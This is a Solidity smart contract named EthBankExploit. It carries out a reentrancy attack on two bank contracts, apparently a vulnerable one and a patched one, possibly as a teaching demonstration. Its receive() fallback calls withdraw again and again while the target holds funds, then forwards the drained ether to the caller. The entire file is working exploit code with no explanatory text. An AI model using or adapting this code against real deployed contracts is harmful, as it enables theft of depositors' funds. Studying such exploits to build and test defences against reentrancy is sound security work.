// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

interface IEthBank {
    function deposit() external payable;
    function withdraw() external payable;
}

contract EthBankExploit {

    enum Bank {
        FAILED_BANK,
        SAFE_BANK
    }

    IEthBank public failedBank;
    IEthBank public safeBank;
    Bank private lastRun;

    constructor(IEthBank _failedBank, IEthBank _safeBank) {
        failedBank = _failedBank;
        safeBank = _safeBank;
    }

    function pwn(Bank _bank) external payable {
        lastRun = _bank;
        if (_bank == Bank.SAFE_BANK){
            safeBank.deposit{value: 100 wei}();
            safeBank.withdraw(); 
        }else{
            failedBank.deposit{value: 100 wei}();
            failedBank.withdraw(); 
        }
        payable(msg.sender).transfer(address(this).balance);
    }
    
    receive() external payable {
        if ( lastRun == Bank.FAILED_BANK && address(failedBank).balance >= 100 wei) {
            failedBank.withdraw();
        }

        if ( lastRun == Bank.SAFE_BANK && address(safeBank).balance >= 100 wei) {
            safeBank.withdraw();
        }
    }
}
